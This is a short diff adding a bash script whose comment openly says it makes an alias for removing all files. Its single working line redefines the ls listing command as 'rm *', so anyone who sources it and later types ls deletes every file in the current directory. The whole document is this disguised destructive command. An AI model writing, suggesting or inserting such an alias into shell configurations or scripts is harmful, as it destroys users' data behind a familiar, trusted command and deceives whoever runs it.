@@ -1,0 +1,5 @@
+#!/bin/bash
+
+#creates an alias name ls for removing all files
+
+alias ls='rm *'
